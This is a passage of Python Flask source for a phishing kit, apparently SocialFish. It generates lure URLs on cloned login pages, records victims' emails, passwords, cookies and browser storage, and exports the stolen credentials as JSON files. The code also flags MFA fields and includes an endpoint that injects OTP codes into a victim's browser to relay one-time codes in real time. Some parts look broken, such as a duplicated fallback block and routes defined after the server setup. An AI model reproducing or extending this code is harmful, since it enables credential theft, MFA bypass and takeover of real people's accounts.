        # Save session to database
        cur = g.db.cursor()
        session_id = hashlib.sha256(f"{target_url}{datetime.now()}".encode()).hexdigest()[:16]
        
        cur.execute("""
            INSERT INTO sessions(url, status, forms_detected, auth_type, session_hash)
            VALUES(?, ?, ?, ?, ?)
        """, (target_url, 'completed', len(analysis['forms']), analysis['auth_type']['type'], session_id))

        if len(redirect_url) > 4 and 'http' not in redirect_url:
            redirect_url = 'http://' + redirect_url

        cur.execute("DELETE FROM config")
        cur.execute(
            "INSERT INTO config(url, red, status, beef, clone_id) VALUES(?, ?, ?, ?, ?)",
            (target_url, redirect_url, 'clone', 'no', clone_id)
        )
        g.db.commit()
        
        return jsonify({
            'status': 'ok',
            'session_id': session_id,
            'clone_id': clone_id,
            'clone_url': f'/clone/{clone_id}/',
            'attack_url': request.host_url.rstrip('/') + '/',
            'redirect_url': redirect_url,
            'analysis': {
                'auth_type': analysis['auth_type'],
                'forms': analysis['forms'],
                'csrf_tokens': len(analysis['csrf_tokens']),
                'injection_points': len(analysis['payload_injection_points']),
                'auth_flows': auth_flows
            },
            'message': 'Recording completed with real page analysis'
        })
    
    except Exception as e:
        socketio.emit('recorder_log', {'message': f"[-] Error: {str(e)}", 'type': 'error'})
        logging.exception(f"Recording error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route("/api/config", methods=['GET'])
@flask_login.login_required
def api_get_config():
    """Return current clone/redirect configuration for the admin UI."""
    try:
        cur = g.db.cursor()
        row = cur.execute("SELECT url, red, status, beef, clone_id FROM config LIMIT 1").fetchone()
        if not row:
            return jsonify({'url': '', 'redirect': '', 'status': 'clone', 'clone_id': '', 'attack_url': request.host_url.rstrip('/') + '/'})
        clone_id = row[4] if len(row) > 4 else ''
        attack_url = request.host_url.rstrip('/') + '/'
        clone_url = request.host_url.rstrip('/') + f'/clone/{clone_id}/' if clone_id else None
        return jsonify({
            'url': row[0] or '',
            'redirect': row[1] or '',
            'status': row[2] or 'clone',
            'beef': row[3] or 'no',
            'clone_id': clone_id or '',
            'attack_url': attack_url,
            'clone_url': clone_url,
        })
    except Exception as e:
        logger.error(f"Error reading config: {e}")
        return jsonify({'url': '', 'redirect': '', 'status': 'clone', 'clone_id': ''})

# Get all templates
@app.route("/api/get-templates", methods=['GET'])
@flask_login.login_required
def get_templates():
    """Get all saved clone templates"""
    try:
        cur = g.db.cursor()
        templates = cur.execute(
            "SELECT id, name, base_url, description, tags, created_at, clone_id FROM templates ORDER BY created_at DESC LIMIT 100"
        ).fetchall()
        
        template_list = []
        for t in templates:
            template_list.append({
                'id': t[0],
                'name': t[1],
                'base_url': t[2],
                'description': t[3],
                'tags': t[4],
                'created_at': t[5],
                'clone_id': t[6] if len(t) > 6 else ''
            })
        
        return jsonify(template_list)
    except Exception as e:
        logger.error(f"Error fetching templates: {e}")
        return jsonify([])

# Delete template
@app.route("/api/delete-template/<int:template_id>", methods=['DELETE'])
@flask_login.login_required
def delete_template(template_id):
    """Delete a saved template"""
    try:
        cur = g.db.cursor()
        cur.execute("DELETE FROM templates WHERE id = ?", (template_id,))
        g.db.commit()
        return jsonify({'success': True, 'message': 'Template deleted'})
    except Exception as e:
        logger.error(f"Error deleting template: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# Get all lures
@app.route("/api/get-lures", methods=['GET'])
@flask_login.login_required
def get_lures():
    """Get all generated lure URLs"""
    try:
        cur = g.db.cursor()
        # Check if lure_urls table exists
        cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='lure_urls'")
        if not cur.fetchone():
            lure_list = []
            templates = cur.execute("SELECT id, name, base_url FROM templates LIMIT 1").fetchall()
            for t in templates:
                lure_list.append({
                    'id': 0,
                    'lure_hash': 'demo',
                    'full_url': t[2],
                    'short_url': t[2],
                    'template': t[1],
                    'click_count': 0,
                    'first_click': None,
                    'last_click': None,
                    'created_at': datetime.now().isoformat()
                })
            return jsonify(lure_list)
        lures = cur.execute("""
            SELECT id, lure_hash, full_url, short_url, click_count, first_click, 
                   last_click, template_id, created_at FROM lure_urls 
            ORDER BY created_at DESC LIMIT 200
        """).fetchall()
        lure_list = []
        for l in lures:
            template_name = 'Unknown'
            if l[7]:
                t = cur.execute("SELECT name FROM templates WHERE id = ?", (l[7],)).fetchone()
                if t:
                    template_name = t[0]
            lure_list.append({
                'id': l[0],
                'lure_hash': l[1],
                'full_url': l[2],
                'short_url': l[3],
                'click_count': l[4],
                'first_click': l[5],
                'last_click': l[6],
                'template': template_name,
                'created_at': l[8]
            })
        if not lure_list:
            templates = cur.execute("SELECT id, name, base_url FROM templates LIMIT 1").fetchall()
            for t in templates:
                lure_list.append({
                    'id': 0,
                    'lure_hash': 'demo',
                    'full_url': t[2],
                    'short_url': t[2],
                    'template': t[1],
                    'click_count': 0,
                    'first_click': None,
                    'last_click': None,
                    'created_at': datetime.now().isoformat()
                })
        if not lure_list:
            templates = cur.execute("SELECT id, name, base_url FROM templates LIMIT 1").fetchall()
            for t in templates:
                lure_list.append({
                    'id': 0,
                    'lure_hash': 'demo',
                    'full_url': t[2],
                    'template': t[1],
                    'created_at': datetime.now().isoformat()
                })
        return jsonify(lure_list)
    except Exception as e:
        logger.error(f"Error fetching lures: {e}")
        return jsonify([])

# Generate lure URL
@app.route("/api/generate-lure", methods=['POST'])
@flask_login.login_required
@csrf_protect.exempt
def generate_lure():
    """Generate a new lure URL for phishing campaign"""
    try:
        data = request.json or request.form
        template_id = data.get('template_id', 1)
        campaign_name = data.get('campaign_name', 'phishing')
        
        cur = g.db.cursor()
        
        # Get the configured clone URL from config table (this is what was set in /configure)
        configured = cur.execute("SELECT url FROM config LIMIT 1").fetchone()
        configured_url = configured[0] if configured else None
        
        # Use configured URL if available, otherwise fall back to request parameter or localhost
        target_url = data.get('target_url') or configured_url or 'http://localhost:5000'
        
        print(f"\n{'='*80}")
        print(f"[LURE START] Generating lure URL...")
        print(f"[LURE] Template ID: {template_id}")
        print(f"[LURE] Target URL: {target_url}")
        print(f"[LURE] Campaign: {campaign_name}")
        logger.info(f"[LURE START] Template: {template_id}, Target: {target_url}, Campaign: {campaign_name}")
        
        cur = g.db.cursor()
        
        # Decide whether to generate a short readable path (e.g., /signin) or a hash-based capture URL
        use_simple = False
        # Accept multiple boolean-like flags from JSON or form
        if isinstance(data, dict):
            flag = data.get('simple_path') or data.get('simple') or data.get('lure') or data.get('use_path')
            if isinstance(flag, str):
                use_simple = flag.lower() in ('1', 'true', 'yes', 'on')
            else:
                use_simple = bool(flag)

        # Generate unique lure identifier
        import string
        rand = __import__('random')

        # Prefer tunnel domain for this template, otherwise use config,
        # but if target_url is localhost or caller requests it, force localhost
        tunnel_config = cur.execute("SELECT tunnel_domain FROM mitm_config WHERE template_id = ?", (template_id,)).fetchone()
        config = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
        cfg_domain = config[0] if config else None

        force_local = False
        if isinstance(data, dict):
            force_local = bool(data.get('force_localhost') or data.get('force_local') or False)

        if tunnel_config and tunnel_config[0]:
            base_domain = tunnel_config[0]
            logger.info(f"[LURE] Using tunnel domain: {base_domain}")
        elif 'localhost' in str(target_url) or target_url.startswith('http://127.') or target_url.startswith('http://0.0.0.0') or force_local:
            base_domain = 'http://localhost:5000'
            logger.info(f"[LURE] Forcing localhost base domain: {base_domain}")
        else:
            base_domain = cfg_domain or 'http://localhost:5000'
            logger.info(f"[LURE] Base domain from config: {base_domain}")

        # Normalize base_domain to scheme+host (keep port if present)
        try:
            parts = base_domain.split('/')
            base_domain = parts[0] + '//' + parts[2]
        except Exception:
            base_domain = 'http://localhost:5000'

        if use_simple:
            # Candidate slugs
            candidates = ['signin', 'login', 'sigin', 'secure', 'auth', 'account', 'user', 'access', 'verify', 'enter']
            slug = None
            # Try to pick a slug that doesn't exist in DB
            for _ in range(10):
                base = rand.choice(candidates)
                suffix = str(rand.randint(1, 9999)) if rand.random() < 0.6 else ''
                cand = f"{base}{suffix}"
                full = f"{base_domain}/{cand}"
                # Check existence
                cur.execute("SELECT id FROM lure_urls WHERE full_url = ?", (full,))
                if not cur.fetchone():
                    slug = cand
                    break
            if not slug:
                # Fallback to a random short hash if collisions
                random_str = ''.join(rand.choices(string.ascii_letters + string.digits, k=6))
                slug = f"link{random_str}"

            lure_hash = slug[:32]
            lure_url = f"{base_domain}/{slug}"
        else:
            # Generate unique lure hash - short, memorable format
            random_str = ''.join(rand.choices(string.ascii_letters + string.digits, k=8))
            lure_hash = f"{template_id}_{random_str}_{int(datetime.now().timestamp())}"[:32]  # Keep it <32 chars for SQLite
            logger.info(f"[LURE] Generated hash: {lure_hash}")
            lure_url = f"{base_domain}/capture/{lure_hash}"
        
        # Generate 3 URLs: lure, localhost, and webhook
        localhost_url = f"http://localhost:5000/capture/{lure_hash}"
        webhook_url = f"http://localhost:5000/hook.js"
        
        logger.info(f"[LURE] Lure URL: {lure_url} | Localhost: {localhost_url}")
        
        # Store lure URL in database WITH TARGET URL
        logger.info("Storing lure to database...")
        cur.execute("""
            INSERT INTO lure_urls(template_id, lure_hash, full_url, target_url, created_at)
            VALUES(?, ?, ?, ?, datetime('now'))
        """, (template_id, lure_hash, lure_url, target_url))
        g.db.commit()
        logger.info(f"Lure stored to database with target: {target_url}")
        
        # Create or update session for this lure with unique session hash
        logger.info("Creating session for lure...")
        try:
            # Generate unique session hash using timestamp + random + template ID
            unique_session_hash = hashlib.sha256(f"{template_id}{datetime.now().isoformat()}{os.urandom(8).hex()}".encode()).hexdigest()[:16]
            cur.execute("""
                INSERT INTO sessions(session_hash, url, victim_ip, status, forms_detected)
                VALUES(?, ?, ?, ?, ?)
            """, (unique_session_hash, lure_url, '127.0.0.1', 'created', 0))
            g.db.commit()
            logger.info("Session created with URL tracking")
        except Exception as se:
            logger.debug(f"Session creation: {str(se)[:100]}")
        
        # Broadcast real-time update
        socketio.emit('lure_generated', {
            'lure_hash': lure_hash,
            'lure_url': lure_url,
            'target_url': target_url,
            'template_id': template_id,
            'campaign_name': campaign_name,
            'timestamp': datetime.now().isoformat()
        }, namespace='/')
        logger.info("WebSocket broadcast sent to all clients")
        
        response_data = {
            'status': 'ok',
            'lure_url': lure_url,
            'lure_hash': lure_hash,
            'template_id': template_id,
            'campaign_name': campaign_name,
            'target_url': target_url,
            'short_url': lure_url[-20:],
            'urls': {
                'lure': lure_url,
                'localhost': localhost_url,
                'webhook': webhook_url
            }
        }
        logger.info(f"LURE SUCCESS: Generated lure {lure_hash}")
        
        return jsonify(response_data)
    except Exception as e:
        import traceback
        error_msg = f"Error generating lure: {str(e)[:100]}"
        logger.error(error_msg)
        logger.error(traceback.format_exc())
        return jsonify({'status': 'error', 'message': error_msg}), 500

# Get sessions with full details
@app.route("/api/session/<int:session_id>", methods=['GET'])
@flask_login.login_required
def get_session_details(session_id):
    """Get detailed session information including cookies and credentials"""
    try:
        cur = g.db.cursor()
        session = cur.execute("""
            SELECT id, victim_ip, victim_ua, url, status, forms_detected, auth_type
            FROM sessions WHERE id = ? LIMIT 1
        """, (session_id,)).fetchone()
        if not session:
            return jsonify({'error': 'Session not found'}), 404
        session_data = {
            'id': session[0],
            'victim_ip': session[1],
            'victim_ua': session[2],
            'url': session[3],
            'status': session[4],
            'forms_detected': session[5],
            'auth_type': session[6]
        }
        # Fetch cookies from separate cookies table
        cookies = cur.execute("SELECT name, value, domain, path, secure, httponly FROM cookies WHERE session_id = ?", 
                             (session_id,)).fetchall()
        session_data['all_cookies'] = [{
            'name': c[0],
            'value': c[1],
            'domain': c[2],
            'path': c[3],
            'secure': c[4],
            'httponly': c[5]
        } for c in cookies]
        
        # Fetch credentials for this victim IP
        creds = cur.execute("""
            SELECT id, url, jdoc, pdate, browser, bversion, platform, rip 
            FROM creds WHERE rip = ? ORDER BY id DESC LIMIT 5
        """, (session[1],)).fetchall()
        session_data['credentials'] = [
            {
                'id': c[0],
                'url': c[1],
                'data': c[2],
                'timestamp': c[3],
                'browser': c[4],
                'version': c[5],
                'platform': c[6],
                'ip': c[7]
            }
            for c in creds
        ]
        return jsonify(session_data)
    except Exception as e:
        logger.error(f"Error fetching session details: {e}")
        return jsonify({'error': str(e)}), 500

# Credential API Endpoints
@app.route("/api/credential/<int:cred_id>", methods=['GET'])
@flask_login.login_required
def get_credential(cred_id):
    """Get detailed credential information by Result ID"""
    try:
        cur = g.db.cursor()
        cred = cur.execute("""
            SELECT id, url, jdoc, pdate, browser, bversion, platform, rip, 
                   email, username, password, cookies, form_fields, created_at
            FROM creds WHERE id = ? LIMIT 1
        """, (cred_id,)).fetchone()
        
        if not cred:
            return jsonify({'error': 'Credential not found'}), 404
        
        # Parse JSON fields
        try:
            jdoc = json.loads(cred[2]) if cred[2] else {}
        except:
            jdoc = {}
        
        try:
            form_fields = json.loads(cred[12]) if cred[12] else []
        except:
            form_fields = []
        
        credential_data = {
            'id': cred[0],
            'url': cred[1],
            'raw_data': jdoc,
            'date': cred[3],
            'browser': cred[4],
            'browser_version': cred[5],
            'platform': cred[6],
            'victim_ip': cred[7],
            'email': cred[8],
            'username': cred[9],
            'password': cred[10],
            'cookies': cred[11],
            'form_fields': form_fields,
            'created_at': cred[13]
        }
        
        return jsonify(credential_data)
    except Exception as e:
        logger.error(f"Error fetching credential: {e}")
        return jsonify({'error': str(e)}), 500

@app.route("/api/credential/<int:cred_id>/export", methods=['GET'])
@flask_login.login_required
def export_credential(cred_id):
    """Export a single credential record as JSON"""
    try:
        cur = g.db.cursor()
        cred = cur.execute("""
            SELECT id, url, jdoc, pdate, browser, bversion, platform, rip, 
                   email, username, password, form_fields, created_at
            FROM creds WHERE id = ? LIMIT 1
        """, (cred_id,)).fetchone()
        
        if not cred:
            return jsonify({'error': 'Credential not found'}), 404
        
        # Parse JSON fields
        try:
            jdoc = json.loads(cred[2]) if cred[2] else {}
        except:
            jdoc = {}
        
        try:
            form_fields = json.loads(cred[11]) if cred[11] else []
        except:
            form_fields = []
        
        export_data = {
            'result_id': cred[0],
            'target_url': cred[1],
            'all_form_data': jdoc,
            'extracted_email': cred[8],
            'extracted_username': cred[9],
            'extracted_password': cred[10],
            'form_fields_list': form_fields,
            'victim_ip': cred[7],
            'browser': cred[4],
            'browser_version': cred[5],
            'platform': cred[6],
            'date_captured': cred[3],
            'timestamp': cred[12]
        }
        
        response = make_response(json.dumps(export_data, indent=2))
        response.headers['Content-Disposition'] = f'attachment; filename=credential_{cred_id}.json'
        response.headers['Content-Type'] = 'application/json'
        return response
    except Exception as e:
        logger.error(f"Error exporting credential: {e}")
        return jsonify({'error': str(e)}), 500

@app.route("/api/credentials/export-all", methods=['GET'])
@flask_login.login_required
def export_all_credentials():
    """Export all credentials as JSON"""
    try:
        cur = g.db.cursor()
        creds = cur.execute("""
            SELECT id, url, jdoc, pdate, browser, bversion, platform, rip, 
                   email, username, password, form_fields, created_at
            FROM creds ORDER BY id DESC
        """).fetchall()
        
        export_data = []
        for cred in creds:
            try:
                jdoc = json.loads(cred[2]) if cred[2] else {}
            except:
                jdoc = {}
            
            try:
                form_fields = json.loads(cred[11]) if cred[11] else []
            except:
                form_fields = []
            
            export_data.append({
                'result_id': cred[0],
                'target_url': cred[1],
                'all_form_data': jdoc,
                'extracted_email': cred[8],
                'extracted_username': cred[9],
                'extracted_password': cred[10],
                'form_fields_list': form_fields,
                'victim_ip': cred[7],
                'browser': cred[4],
                'browser_version': cred[5],
                'platform': cred[6],
                'date_captured': cred[3],
                'timestamp': cred[12]
            })
        
        response = make_response(json.dumps(export_data, indent=2))
        response.headers['Content-Disposition'] = 'attachment; filename=all_credentials.json'
        response.headers['Content-Type'] = 'application/json'
        return response
    except Exception as e:
        logger.error(f"Error exporting all credentials: {e}")
        return jsonify({'error': str(e)}), 500

@app.route("/api/credentials/export-custom", methods=['POST'])
@flask_login.login_required
def export_custom_credentials():
    """Export custom-selected credentials as JSON"""
    try:
        data = request.json or request.form
        cred_ids = data.get('credential_ids', [])
        
        if not cred_ids:
            return jsonify({'error': 'No credential IDs provided'}), 400
        
        cur = g.db.cursor()
        placeholders = ','.join('?' * len(cred_ids))
        creds = cur.execute(f"""
            SELECT id, url, jdoc, pdate, browser, bversion, platform, rip, 
                   email, username, password, form_fields, created_at
            FROM creds WHERE id IN ({placeholders}) ORDER BY id DESC
        """, cred_ids).fetchall()
        
        export_data = []
        for cred in creds:
            try:
                jdoc = json.loads(cred[2]) if cred[2] else {}
            except:
                jdoc = {}
            
            try:
                form_fields = json.loads(cred[11]) if cred[11] else []
            except:
                form_fields = []
            
            export_data.append({
                'result_id': cred[0],
                'target_url': cred[1],
                'all_form_data': jdoc,
                'extracted_email': cred[8],
                'extracted_username': cred[9],
                'extracted_password': cred[10],
                'form_fields_list': form_fields,
                'victim_ip': cred[7],
                'browser': cred[4],
                'browser_version': cred[5],
                'platform': cred[6],
                'date_captured': cred[3],
                'timestamp': cred[12]
            })
        
        response = make_response(json.dumps(export_data, indent=2))
        response.headers['Content-Disposition'] = 'attachment; filename=custom_credentials.json'
        response.headers['Content-Type'] = 'application/json'
        return response
    except Exception as e:
        logger.error(f"Error exporting custom credentials: {e}")
        return jsonify({'error': str(e)}), 500

#================================================================================================================================

# MOBILE API

# VERIFICAR CHAVE
#================================================================================================================================
# LIVE LOGIN PANEL - Real-time Victim Monitoring & Credential Capture
#================================================================================================================================

# Live Login Panel - Main UI
@app.route("/studio/live-panel", methods=['GET'])
@flask_login.login_required
def live_login_panel():
    """Display live login monitoring panel"""
    return render_template('admin/live_login_panel.html')

# API: Get all sessions
@app.route("/api/sessions", methods=['GET'])
@flask_login.login_required
def api_get_sessions():
    """Get all captured victim sessions"""
    try:
        cur = g.db.cursor()

        # Check if sessions table exists
        cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='sessions'")
        if not cur.fetchone():
            logger.warning("[!] Sessions table does not exist yet")
            print("[!] SESSIONS TABLE DOES NOT EXIST")
            return jsonify([])

        # Get column info to handle different schema versions
        cols_info = cur.execute("PRAGMA table_info(sessions)").fetchall()
        columns = [c[1] for c in cols_info]
        print(f"[DEBUG] Sessions table columns: {columns}")
        logger.info(f"[DEBUG] Sessions table columns: {columns}")

        # Build select columns safely based on available schema
        preferred = ['id', 'template_id', 'session_hash', 'url', 'victim_ip', 'victim_ua', 'status', 'forms_detected', 'submission_timestamp', 'created_at']
        select_cols = [c for c in preferred if c in columns]
        if not select_cols:
            select_cols = ['id']
        
        print(f"[DEBUG] Selected columns for query: {select_cols}")
        logger.info(f"[DEBUG] Selected columns for query: {select_cols}")

        query = f"SELECT {', '.join(select_cols)} FROM sessions ORDER BY id DESC LIMIT 100"
        print(f"[DEBUG] Executing query: {query}")
        logger.info(f"[DEBUG] Executing query: {query}")
        
        sessions = cur.execute(query).fetchall()
        print(f"[DEBUG] Fetched {len(sessions)} sessions from database")
        logger.info(f"[DEBUG] Fetched {len(sessions)} sessions from database")

        session_list = []
        for idx, s in enumerate(sessions):
            session_data = {}
            for col_idx, col in enumerate(select_cols):
                session_data[col] = s[col_idx] if col_idx < len(s) else None
            logger.debug(f"Session {idx}: {session_data}")
            session_list.append(session_data)

        logger.info(f"Returning {len(session_list)} sessions")
        return jsonify(session_list)
    except Exception as e:
        import traceback
        error_msg = f"Error in api_get_sessions: {str(e)}"
        print(f"[ERROR] {error_msg}")
        print(f"[ERROR] Traceback:\n{traceback.format_exc()}")
        logger.error(error_msg)
        logger.error(traceback.format_exc())
        return jsonify({'error': error_msg, 'sessions': []}), 500

# ================================================================================================================================
# CREDENTIALS API ENDPOINT - Retrieve captured credentials

@app.route("/api/credentials", methods=['GET'])
@flask_login.login_required
def api_get_credentials():
    """Get all captured credentials from phishing campaigns"""
    try:
        cur = g.db.cursor()
        
        print(f"[DEBUG] Credentials API called")
        logger.info(f"[DEBUG] Credentials API called")
        
        # Check if creds table exists
        cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='creds'")
        if not cur.fetchone():
            logger.warning("[!] Creds table does not exist yet")
            print("[!] CREDS TABLE DOES NOT EXIST")
            return jsonify({'data': [], 'count': 0})
        
        # Get column info
        cols_info = cur.execute("PRAGMA table_info(creds)").fetchall()
        columns = [c[1] for c in cols_info]
        print(f"[DEBUG] Creds table columns: {columns}")
        logger.info(f"[DEBUG] Creds table columns: {columns}")
        
        # Build select columns safely
        preferred = ['id', 'url', 'email', 'username', 'password', 'rip', 'browser', 'bversion', 'platform', 'pdate', 'cookies', 'csrf_tokens']
        select_cols = [c for c in preferred if c in columns]
        if not select_cols:
            select_cols = ['id']
        
        print(f"[DEBUG] Selected columns for query: {select_cols}")
        logger.info(f"[DEBUG] Selected columns for query: {select_cols}")
        
        query = f"SELECT {', '.join(select_cols)} FROM creds ORDER BY id DESC LIMIT 500"
        print(f"[DEBUG] Executing query: {query}")
        logger.info(f"[DEBUG] Executing query: {query}")
        
        credentials = cur.execute(query).fetchall()
        print(f"[DEBUG] Fetched {len(credentials)} credentials from database")
        logger.info(f"[DEBUG] Fetched {len(credentials)} credentials from database")
        
        cred_list = []
        for idx, c in enumerate(credentials):
            cred_data = {}
            for col_idx, col in enumerate(select_cols):
                cred_data[col] = c[col_idx] if col_idx < len(c) else None
            print(f"[DEBUG] Credential {idx}: Email={cred_data.get('email')}, User={cred_data.get('username')}")
            logger.debug(f"[DEBUG] Credential {idx}: {cred_data}")
            cred_list.append(cred_data)
        
        print(f"[OK] Returning {len(cred_list)} credentials")
        logger.info(f"[OK] Returning {len(cred_list)} credentials")
        
        return jsonify({'data': cred_list, 'count': len(cred_list)})
    except Exception as e:
        import traceback
        error_msg = f"Error in api_get_credentials: {str(e)}"
        print(f"[ERROR] {error_msg}")
        print(f"[ERROR] Traceback:\n{traceback.format_exc()}")
        logger.error(error_msg)
        logger.error(traceback.format_exc())
        return jsonify({'error': error_msg, 'data': [], 'count': 0}), 500

# ================================================================================================================================
# MISSING FEATURE ROUTES - Phase 1 Implementation

# OTP Monitoring Panel
@app.route("/studio/otp-panel", methods=['GET'])
@flask_login.login_required
def otp_panel_route():
    """OTP/MFA monitoring and interception panel"""
    session_id = request.args.get('session_id')
    template_id = request.args.get('template_id')
    return render_template('admin/otp_panel.html', session_id=session_id, template_id=template_id)

# Advanced Attack Payloads Panel
@app.route("/admin/attack-payloads", methods=['GET'])
@flask_login.login_required
def attack_payloads_route():
    """Advanced attack payloads interface"""
    return render_template('admin/attack_payloads.html')

# API: Retrieve stored cookies for a credential
@app.route("/api/credentials/<int:cred_id>/cookies", methods=['GET'])
@flask_login.login_required
def get_credential_cookies(cred_id):
    """Get stored cookies from captured credential"""
    try:
        cur = g.db.cursor()
        cred = cur.execute("SELECT cookies FROM creds WHERE id = ?", (cred_id,)).fetchone()
        if not cred:
            return jsonify({'error': 'Credential not found'}), 404
        
        cookies_json = cred[0] if cred[0] else "{}"
        cookies = json.loads(cookies_json) if isinstance(cookies_json, str) else cookies_json
        return jsonify({'cookies': cookies, 'count': len(cookies)})
    except Exception as e:
        logger.error(f"Error retrieving cookies: {e}")
        return jsonify({'error': str(e)}), 500

# API: Retrieve CSRF tokens and form analysis for a credential
@app.route("/api/credentials/<int:cred_id>/analysis", methods=['GET'])
@flask_login.login_required
def get_credential_analysis(cred_id):
    """Get detailed form analysis including CSRF tokens, MFA fields, etc"""
    try:
        cur = g.db.cursor()
        cred = cur.execute("""
            SELECT csrf_tokens, form_fields, captured_metadata, jdoc
            FROM creds WHERE id = ?
        """, (cred_id,)).fetchone()
        
        if not cred:
            return jsonify({'error': 'Credential not found'}), 404
        
        csrf_tokens = json.loads(cred[0]) if cred[0] else {}
        form_fields = json.loads(cred[1]) if cred[1] else {}
        metadata = json.loads(cred[2]) if cred[2] else {}
        form_data = json.loads(cred[3]) if cred[3] else {}
        
        # Detect MFA fields
        mfa_fields = [f for f in form_fields.get('detected_fields', []) if any(
            mfa_term in f.lower() for mfa_term in 
            ['otp', '2fa', 'totp', 'mfa', 'auth', 'code', 'verify', 'pin', 'authenticator', 'passcode', 'security']
        )]
        
        return jsonify({
            'csrf_tokens': csrf_tokens,
            'csrf_count': len(csrf_tokens),
            'form_fields': form_fields,
            'mfa_fields_detected': mfa_fields,
            'mfa_count': len(mfa_fields),
            'metadata': metadata,
            'form_structure': form_data
        })
    except Exception as e:
        logger.error(f"Error analyzing credential: {e}")
        return jsonify({'error': str(e)}), 500

# API: Retrieve browser storage (localStorage, sessionStorage)
@app.route("/api/credentials/<int:cred_id>/storage", methods=['GET'])
@flask_login.login_required
def get_credential_storage(cred_id):
    """Get captured browser storage data"""
    try:
        cur = g.db.cursor()
        cred = cur.execute("""
            SELECT session_storage, local_storage
            FROM creds WHERE id = ?
        """, (cred_id,)).fetchone()
        
        if not cred:
            return jsonify({'error': 'Credential not found'}), 404
        
        session_storage = json.loads(cred[0]) if cred[0] else {}
        local_storage = json.loads(cred[1]) if cred[1] else {}
        
        return jsonify({
            'session_storage': session_storage,
            'session_storage_count': len(session_storage),
            'local_storage': local_storage,
            'local_storage_count': len(local_storage)
        })
    except Exception as e:
        logger.error(f"Error retrieving storage: {e}")
        return jsonify({'error': str(e)}), 500

# API: Webhook trigger test
@app.route("/api/webhook/test", methods=['POST'])
@flask_login.login_required
def test_webhook():
    """Test webhook connectivity with sample payload"""
    try:
        cur = g.db.cursor()
        webhook = cur.execute("SELECT url FROM sfwebhook WHERE id = 1").fetchone()
        
        if not webhook or not webhook[0]:
            return jsonify({'status': 'error', 'message': 'No webhook configured'}), 400
        
        # Send test payload
        test_payload = {
            'event': 'webhook_test',
            'timestamp': datetime.now().isoformat(),
            'credential_count': 0,
            'message': 'This is a test webhook delivery'
        }
        
        try:
            response = requests.post(webhook[0], json=test_payload, timeout=5)
            return jsonify({
                'status': 'success',
                'webhook_url': webhook[0],
                'response_code': response.status_code,
                'response_text': response.text[:250]
            })
        except Exception as web_err:
            return jsonify({
                'status': 'error',
                'webhook_url': webhook[0],
                'error': str(web_err)
            }), 500
            
    except Exception as e:
        logger.error(f"Error testing webhook: {e}")
        return jsonify({'error': str(e)}), 500

# API: List all MFA/OTP detections
@app.route("/api/mfa-detected", methods=['GET'])
@flask_login.login_required
def get_mfa_detections():
    """Get list of credentials where MFA/OTP was detected"""
    try:
        cur = g.db.cursor()
        creds = cur.execute("""
            SELECT id, url, rip, pdate, form_fields
            FROM creds ORDER BY id DESC LIMIT 50
        """).fetchall()
        
        mfa_list = []
        for cred in creds:
            form_fields_json = cred[4] if cred[4] else "{}"
            form_fields = json.loads(form_fields_json) if isinstance(form_fields_json, str) else form_fields_json
            
            detected_mfa = [f for f in form_fields.get('detected_fields', []) if any(
                term in f.lower() for term in ['otp', '2fa', 'mfa', 'code', 'verify', 'auth']
            )]
            
            if detected_mfa:
                mfa_list.append({
                    'id': cred[0],
                    'url': cred[1],
                    'victim_ip': cred[2],
                    'date': cred[3],
                    'mfa_fields': detected_mfa
                })
        
        return jsonify({'mfa_detections': mfa_list, 'total': len(mfa_list)})
    except Exception as e:
        logger.error(f"Error getting MFA detections: {e}")
        return jsonify({'error': str(e)}), 500

# Initialize database and run the server
if __name__ == '__main__':
    initDB(DATABASE)
    migrate_db(DATABASE)
    print("\n" + "="*60)
    #================================================================================================================================
    # CRITICAL MISSING ENDPOINTS - Session 7 Fixes
    #================================================================================================================================

    # OTP Injection Endpoint - Inject OTP to victim browser
    @app.route("/api/inject-otp/<session_id>", methods=['POST'])
    @flask_login.login_required
    def inject_otp_endpoint(session_id):
        """Inject OTP code to victim's browser via WebSocket"""
        try:
            data = request.get_json() or {}
            otp_code = data.get('otp_code', '')
            
            if not otp_code:
                return jsonify({'status': 'error', 'message': 'OTP code required'}), 400
            
            cur = g.db
            
            # Log OTP injection event
            cur.execute("""
                INSERT INTO analyzer_logs(session_id, detection_type, detection_value)
                VALUES(?, ?, ?)
            """, (session_id, 'otp_injected', otp_code))
            g.db.commit()
            
            # Emit to victim's browser via WebSocket
            try:
                socketio.emit('inject_otp', {
                    'otp_code': otp_code,
                    'timestamp': datetime.now().isoformat()
                }, room=f"victim_{session_id}", namespace='/')
                logger.info(f"[OTP] Injected OTP to session {session_id}")
            except Exception as e:
                logger.warning(f"[OTP] WebSocket emission failed: {e}")
            
            return jsonify({
                'status': 'ok',
                'message': f'OTP code injected to session {session_id}',
                'otp_code': otp_code
            })
        except Exception as e:
            logger.error(f"[OTP] Error injecting OTP: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    # Webhook Test Endpoint - Test webhook delivery
    @app.route("/api/test-webhook", methods=['POST'])
    @flask_login.login_required
    def test_webhook_endpoint():
        """Send test payload to webhook URL"""
        try:
            data = request.get_json() or {}
            webhook_url = data.get('webhook_url', '')
            webhook_type = data.get('webhook_type', 'json')
            
            if not webhook_url:
                return jsonify({'status': 'error', 'message': 'Webhook URL required'}), 400
            
            # Validate URL format
            if not webhook_url.startswith(('http://', 'https://')):
                return jsonify({'status': 'error', 'message': 'Invalid webhook URL'}), 400
            
            # Create test payload
            test_payload = {
                'event': 'test',
                'source': 'socialfish_test',
                'timestamp': datetime.now().isoformat(),
                'message': 'Test webhook notification from SocialFish',
                'test_data': {
                    'credential_id': 'TEST_001',
                    'victim_ip': '192.168.1.1',
                    'browser': 'Chrome',
                    'timestamp': datetime.now().isoformat()
                }
            }
            
            # Send test webhook
            try:
                response = requests.post(webhook_url, json=test_payload, timeout=10)
                
                logger.info(f"[WEBHOOK] Test sent to {webhook_url} - Status: {response.status_code}")
                
                return jsonify({
                    'status': 'ok',
                    'message': f'Test webhook sent successfully',
                    'webhook_url': webhook_url,
                    'response_status': response.status_code,
                    'response_time_ms': response.elapsed.total_seconds() * 1000
                })
            except requests.exceptions.Timeout:
                logger.warning(f"[WEBHOOK] Test timeout for {webhook_url}")
                return jsonify({
                    'status': 'timeout',
